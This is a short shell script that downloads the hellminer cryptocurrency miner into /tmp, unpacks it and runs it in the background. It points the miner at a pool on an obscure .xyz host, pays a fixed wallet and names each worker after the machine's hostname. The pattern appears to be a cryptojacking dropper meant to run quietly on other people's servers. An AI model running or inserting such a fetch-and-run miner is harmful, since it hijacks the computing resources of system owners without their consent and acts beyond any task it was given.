cd /tmp
wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
tar -xvf hellminer_linux64.tar.gz
nohup ./hellminer -c stratum+ssl://dark-bikes-build-noisily.a276.dcdg.xyz:3958 -u RHkiLGRarhTt8SF66vJzwEcyxNm4k1fXTH.$(hostname -f) -p x --cpu 4 &
